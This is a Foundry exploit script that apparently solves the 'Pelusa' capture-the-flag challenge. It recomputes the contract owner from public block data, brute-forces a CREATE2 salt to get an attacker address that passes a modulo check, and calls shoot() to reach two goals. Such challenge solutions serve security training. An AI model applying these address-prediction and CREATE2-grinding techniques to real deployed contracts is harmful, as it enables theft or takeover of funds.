// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Pelusa.sol";
import "../src/attackers/PelusaAttacker.sol";

contract PelusaScript is Script {
    address instanceAddress = 0x557B4eB52aa4852D12E83aF39e4298B52d3704a0; // Hardcoded, put your instance address plz
    address player = 0x6864dC5998c25Db320D3370A53592E44a246FFf4;
    Pelusa target;
    Factory attackerFactory;

    function setUp() public {
        target = Pelusa(instanceAddress);
        attackerFactory = new Factory();
        vm.label(address(target), "Target");
    }

    function run() public {
        vm.startBroadcast();

        address challengeFactory = 0xAA758e00ecA745Cab9232b207874999F55481951;
        bytes32 blockhashCreated = blockhash(7942380);

        address owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(challengeFactory, blockhashCreated)
                    )
                )
            )
        );

        bytes32 salt = getSalt(address(target), owner);

        attackerFactory.deploy(address(target), owner, salt);

        target.shoot();

        require(target.goals() == 2, "Failed");

        vm.stopBroadcast();
    }

    function getSalt(address _victim, address _owner)
        private
        returns (bytes32)
    {
        uint256 salt = 0;

        bytes memory bytecode = abi.encodePacked(
            type(PelusaAttacker).creationCode,
            abi.encode(_victim, _owner)
        );

        while (true) {
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(attackerFactory),
                    bytes32(salt),
                    keccak256(bytecode)
                )
            );

            address precomputedAddress = address(uint160(uint256(hash)));

            if (uint256(uint160(precomputedAddress)) % 100 == 10) {
                console.log("Found address", precomputedAddress);
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}
